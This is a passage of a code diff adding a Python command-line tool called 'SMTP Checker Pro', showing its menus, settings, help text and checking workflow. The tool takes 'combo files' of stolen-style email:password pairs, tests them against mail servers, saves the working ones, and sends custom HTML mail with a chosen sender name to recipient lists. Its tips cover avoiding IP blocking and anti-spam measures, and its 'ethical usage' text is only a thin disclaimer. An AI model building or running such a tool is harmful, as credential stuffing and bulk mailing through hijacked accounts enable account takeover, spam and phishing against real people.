+        <div class="footer">
+            <p>This is an automated test message. Please do not reply.</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+def show_menu():
+    """Display the main menu."""
+    print_header()
+    print(f"{Fore.WHITE + Style.BRIGHT}📋 MAIN MENU{Style.RESET_ALL}\n")
+    print(f"{Fore.CYAN}1. {Fore.WHITE}Start SMTP Checking{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}2. {Fore.WHITE}Settings{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}3. {Fore.WHITE}View Statistics{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}4. {Fore.WHITE}Help{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}5. {Fore.WHITE}Exit{Style.RESET_ALL}\n")
+    
+    choice = input(f"{Fore.CYAN}Enter your choice (1-5): {Style.RESET_ALL}")
+    return choice
+
+def show_settings_menu():
+    """Display and modify settings."""
+    while True:
+        print_header()
+        print(f"{Fore.WHITE + Style.BRIGHT}⚙️ SETTINGS MENU{Style.RESET_ALL}\n")
+        print(f"{Fore.CYAN}1. {Fore.WHITE}Max Worker Threads: {CONFIG['max_workers']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}2. {Fore.WHITE}Test Mode: {'Enabled' if CONFIG['test_mode'] else 'Disabled'}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}3. {Fore.WHITE}Verbose Logging: {'Enabled' if CONFIG['verbose_logging'] else 'Disabled'}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}4. {Fore.WHITE}Batch Size: {CONFIG['batch_size']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}5. {Fore.WHITE}Retry Count: {CONFIG['retry_count']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}6. {Fore.WHITE}Rate Limit Delay: {CONFIG['rate_limit_delay']}s{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}7. {Fore.WHITE}Ethical Mode: {'Enabled' if CONFIG['ethical_mode'] else 'Disabled'}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}8. {Fore.WHITE}Back to Main Menu{Style.RESET_ALL}\n")
+        
+        choice = input(f"{Fore.CYAN}Enter setting to change (1-8): {Style.RESET_ALL}")
+        
+        if choice == '1':
+            value = input(f"{Fore.CYAN}Enter new max worker threads (1-10): {Style.RESET_ALL}")
+            try:
+                value = int(value)
+                if 1 <= value <= 10:
+                    CONFIG['max_workers'] = value
+                else:
+                    print(f"{Fore.RED}Value must be between 1-10{Style.RESET_ALL}")
+                    time.sleep(1)
+            except ValueError:
+                print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
+                time.sleep(1)
+                
+        elif choice == '2':
+            CONFIG['test_mode'] = not CONFIG['test_mode']
+            
+        elif choice == '3':
+            CONFIG['verbose_logging'] = not CONFIG['verbose_logging']
+            
+        elif choice == '4':
+            value = input(f"{Fore.CYAN}Enter new batch size (1-200): {Style.RESET_ALL}")
+            try:
+                value = int(value)
+                if 1 <= value <= 200:
+                    CONFIG['batch_size'] = value
+                else:
+                    print(f"{Fore.RED}Value must be between 1-200{Style.RESET_ALL}")
+                    time.sleep(1)
+            except ValueError:
+                print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
+                time.sleep(1)
+                
+        elif choice == '5':
+            value = input(f"{Fore.CYAN}Enter new retry count (1-5): {Style.RESET_ALL}")
+            try:
+                value = int(value)
+                if 1 <= value <= 5:
+                    CONFIG['retry_count'] = value
+                else:
+                    print(f"{Fore.RED}Value must be between 1-5{Style.RESET_ALL}")
+                    time.sleep(1)
+            except ValueError:
+                print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
+                time.sleep(1)
+                
+        elif choice == '6':
+            value = input(f"{Fore.CYAN}Enter new rate limit delay in seconds (1-10): {Style.RESET_ALL}")
+            try:
+                value = int(value)
+                if 1 <= value <= 10:
+                    CONFIG['rate_limit_delay'] = value
+                else:
+                    print(f"{Fore.RED}Value must be between 1-10{Style.RESET_ALL}")
+                    time.sleep(1)
+            except ValueError:
+                print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
+                time.sleep(1)
+                
+        elif choice == '7':
+            CONFIG['ethical_mode'] = not CONFIG['ethical_mode']
+            
+        elif choice == '8':
+            break
+        
+        else:
+            print(f"{Fore.RED}Invalid choice{Style.RESET_ALL}")
+            time.sleep(1)
+
+def show_help():
+    """Display help information."""
+    print_header()
+    print(f"{Fore.WHITE + Style.BRIGHT}📚 HELP & INFORMATION{Style.RESET_ALL}\n")
+    
+    print(f"{Fore.CYAN + Style.BRIGHT}What is SMTP Checker Pro?{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}SMTP Checker Pro is a tool for verifying SMTP credentials and testing email delivery.")
+    print(f"It helps identify working SMTP servers for email accounts and tests their ability to send emails.\n")
+    
+    print(f"{Fore.CYAN + Style.BRIGHT}File Formats:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}1. Combo File: Text file with one email:password per line")
+    print(f"2. Recipients File: Text file with one email address per line\n")
+    
+    print(f"{Fore.CYAN + Style.BRIGHT}Output Files:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}1. smtp_valid.txt: Working SMTP servers")
+    print(f"2. smtp_errors.txt: Failed SMTP servers and errors")
+    print(f"3. smtp_log.txt: Detailed logs of all operations\n")
+    
+    print(f"{Fore.CYAN + Style.BRIGHT}Ethical Usage Guidelines:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}• Only test email accounts you own or have permission to test")
+    print(f"• Do not use this tool for sending unsolicited emails (spam)")
+    print(f"• Respect email service providers' terms of service")
+    print(f"• Be aware of and comply with relevant laws and regulations")
+    print(f"• Use rate limiting to avoid triggering anti-spam measures\n")
+    
+    print(f"{Fore.CYAN + Style.BRIGHT}Tips for Best Results:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}• Use fresh, valid email:password combinations")
+    print(f"• Start with a small number of threads (3-5) to avoid IP blocking")
+    print(f"• Enable Test Mode for initial validation without sending emails")
+    print(f"• Check smtp_log.txt for detailed error information")
+    print(f"• Some email providers require app-specific passwords or reduced security settings\n")
+    
+    input(f"{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+
+def start_smtp_check():
+    """Start the SMTP checking process."""
+    print_header()
+    print(f"{Fore.WHITE + Style.BRIGHT}🚀 START SMTP CHECKING{Style.RESET_ALL}\n")
+    
+    # Get input files
+    combo_file = input(f"{Fore.CYAN}Enter path to combo file (email:password): {Style.RESET_ALL}")
+    recipient_file = input(f"{Fore.CYAN}Enter path to recipients file: {Style.RESET_ALL}")
+    
+    # Validate files exist
+    if not os.path.exists(combo_file):
+        print(f"{Fore.RED}❌ Combo file not found: {combo_file}{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+        return
+    
+    if not os.path.exists(recipient_file):
+        print(f"{Fore.RED}❌ Recipients file not found: {recipient_file}{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+        return
+    
+    # Get test email details
+    test_email = input(f"{Fore.CYAN}Enter email for SMTP testing: {Style.RESET_ALL}")
+    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", test_email):
+        print(f"{Fore.RED}❌ Invalid test email format{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+        return
+    
+    # Get sender details
+    sender_name = input(f"{Fore.CYAN}Enter sender name (e.g., John Doe): {Style.RESET_ALL}")
+    if not sender_name:
+        sender_name = "SMTP Test"
+    
+    # Get email subject
+    subject = input(f"{Fore.CYAN}Enter email subject: {Style.RESET_ALL}")
+    if not subject:
+        subject = "SMTP Test Email"
+    
+    # Get HTML content
+    print(f"\n{Fore.CYAN}Enter HTML content (press Enter for default template, or type 'custom' to enter your own):{Style.RESET_ALL}")
+    html_choice = input()
+    
+    if html_choice.lower() == 'custom':
+        print(f"\n{Fore.CYAN}Enter custom HTML content (type 'EOF' on a new line when finished):{Style.RESET_ALL}")
+        html_lines = []
+        while True:
+            line = input()
+            if line == 'EOF':
+                break
+            html_lines.append(line)
+        html_content = '\n'.join(html_lines)
+        if not html_content or html_content.lower().find('<html') == -1:
+            print(f"{Fore.YELLOW}⚠️ Invalid HTML content. Using default template.{Style.RESET_ALL}")
+            html_content = load_default_html_template()
+    else:
+        html_content = load_default_html_template()
+    
+    # Confirm settings
+    print("\n" + "-" * 50)
+    print(f"{Fore.WHITE + Style.BRIGHT}📋 Configuration Summary:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}• Combo File: {combo_file}")
+    print(f"• Recipients File: {recipient_file}")
+    print(f"• Test Email: {test_email}")
+    print(f"• Sender Name: {sender_name}")
+    print(f"• Subject: {subject}")
+    print(f"• Max Threads: {CONFIG['max_workers']}")
+    print(f"• Test Mode: {'Enabled' if CONFIG['test_mode'] else 'Disabled'}")
+    print(f"• Batch Size: {CONFIG['batch_size']}")
+    print("-" * 50 + "\n")
+    
+    confirm = input(f"{Fore.CYAN}Start SMTP checking with these settings? (yes/no): {Style.RESET_ALL}")
+    if confirm.lower() != 'yes':
+        print(f"{Fore.YELLOW}⚠️ Operation cancelled{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+        return
+    
+    # Reset statistics
+    with STATS_LOCK:
+        STATS["total_emails"] = 0
+        STATS["valid_smtp"] = 0
+        STATS["failed_smtp"] = 0
+        STATS["emails_sent"] = 0
+        STATS["start_time"] = None
+    
+    # Start processing
+    print(f"\n{Fore.GREEN}🚀 Starting SMTP checking process...{Style.RESET_ALL}\n")
+    process_combolist(combo_file, test_email, sender_name, subject, html_content, recipient_file, CONFIG['max_workers'])
+    
+    # Show final statistics
+    print_footer()
+    print(f"\n{Fore.GREEN}✅ SMTP checking completed!{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}Results saved to:{Style.RESET_ALL}")
+    print(f"• smtp_valid.txt - Working SMTP servers")
+    print(f"• smtp_errors.txt - Failed attempts")
+    print(f"• smtp_log.txt - Detailed logs")
+    
+    input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+
+def show_statistics():
+    """Display current statistics."""
+    print_header()
+    print(f"{Fore.WHITE + Style.BRIGHT}📊 STATISTICS{Style.RESET_ALL}\n")
+    
+    # Calculate success rate
+    if STATS["total_emails"] > 0:
+        success_rate = (STATS["valid_smtp"] / STATS["total_emails"]) * 100
+    else:
+        success_rate = 0
+    
+    # Show statistics
+    print(f"{Fore.WHITE}• Total Emails Processed: {STATS['total_emails']}")
+    print(f"• Valid SMTP Servers: {Fore.GREEN}{STATS['valid_smtp']}{Style.RESET_ALL}")
+    print(f"• Failed SMTP Servers: {Fore.RED}{STATS['failed_smtp']}{Style.RESET_ALL}")
+    print(f"• Success Rate: {Fore.CYAN}{success_rate:.1f}%{Style.RESET_ALL}")
+    print(f"• Emails Sent: {Fore.GREEN}{STATS['emails_sent']}{Style.RESET_ALL}")
+    
+    # Show elapsed time if applicable
+    if STATS["start_time"]:
+        elapsed = time.time() - STATS["start_time"]
+        elapsed_str = f"{int(elapsed // 60)}m {int(elapsed % 60)}s"
+        print(f"• Elapsed Time: {elapsed_str}")
+    
+    # Show file statistics if available
+    try:
+        valid_count = sum(1 for _ in open('smtp_valid.txt', 'r', encoding='utf-8'))
+        error_count = sum(1 for _ in open('smtp_errors.txt', 'r', encoding='utf-8'))
+        
+        print(f"\n{Fore.WHITE + Style.BRIGHT}File Statistics:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}• Valid SMTP Entries: {valid_count}")
+        print(f"• Error Entries: {error_count}")
+    except FileNotFoundError:
+        pass
+    
+    input(f"\n{Fore.CYAN}Press Enter to return to the main menu...{Style.RESET_ALL}")
+
+def main():
+    """Main function with interactive menu."""
+    # Initialize
+    initialize_logs()
+    
+    # Show ethical warning if enabled
+    if CONFIG["ethical_mode"]:
+        ethical_warning()
+    
+    # Main menu loop
+    while True:
+        choice = show_menu()
+        
+        if choice == '1':
+            start_smtp_check()
+        elif choice == '2':
+            show_settings_menu()
+        elif choice == '3':
+            show_statistics()
+        elif choice == '4':
+            show_help()
+        elif choice == '5':
+            print(f"\n{Fore.GREEN}✅ Thank you for using SMTP Checker Pro. Goodbye!{Style.RESET_ALL}")
+            break
+        else:
+            print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{Fore.YELLOW}⚠️ Program interrupted by user.{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}Goodbye!{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"\n{Fore.RED}❌ Unexpected error: {str(e)}{Style.RESET_ALL}")
+        log_error(f"Unexpected error: {str(e)}")
+        print(f"{Fore.YELLOW}Please check smtp_log.txt for details.{Style.RESET_ALL}")
